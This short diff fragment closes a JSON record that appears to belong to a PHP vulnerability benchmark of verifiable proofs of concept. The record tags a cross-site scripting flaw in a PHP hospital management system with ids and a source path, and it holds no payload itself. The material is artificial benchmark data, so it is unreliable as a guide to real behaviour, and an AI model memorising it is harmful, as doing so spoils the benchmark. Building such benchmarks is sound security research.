+    "request_id": "requests.68286fbd75ab4",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_f006a9",
+    "vuln_type": "xss"
+  }
+]
